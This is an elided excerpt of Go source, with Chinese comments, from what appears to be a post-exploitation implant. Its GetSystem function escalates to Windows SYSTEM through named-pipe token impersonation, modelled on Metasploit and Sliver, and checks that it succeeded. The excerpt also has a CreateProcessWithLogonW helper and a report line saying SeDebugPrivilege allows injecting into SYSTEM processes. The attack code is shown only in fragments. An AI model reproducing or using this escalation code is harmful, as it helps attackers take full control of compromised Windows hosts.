...
// GetSystem 使用命名管道模拟技术提权到 SYSTEM。
// 借鉴 Metasploit/Sliver 的 getsystem 实现：
// 1. 创建命名管道
...
func GetSystem() error {
	...
	if ret == 0 {
		return fmt.Errorf("ImpersonateNamedPipeClient: %v", err)
	}
	...
	if err := windows.OpenThreadToken(hThread, TOKEN_ALL_ACCESS, false, &hThreadToken); err != nil {
		return fmt.Errorf("OpenThreadToken: %v", err)
	}
	...
	if ret == 0 {
		return fmt.Errorf("SetThreadToken: %v", err)
	}

	// 10. 验证
	currentUser := whoami()
	if !strings.EqualFold(currentUser, "SYSTEM") && !strings.EqualFold(currentUser, "NT AUTHORITY\\SYSTEM") {
		return fmt.Errorf("getsystem: token changed but not SYSTEM (got: %s)", currentUser)
	}
...
func createProcessWithLogon(domain, user, pass, cmd *uint16) error {
	...
	if ret == 0 {
		return fmt.Errorf("CreateProcessWithLogonW: %v", err)
	}
...
// GetSystemReport 返回 getsystem 尝试结果。
func GetSystemReport() string {
	...
	if hasSeDebug {
		sb.WriteString("  [OK] SeDebugPrivilege — can inject into SYSTEM processes\n")
	}
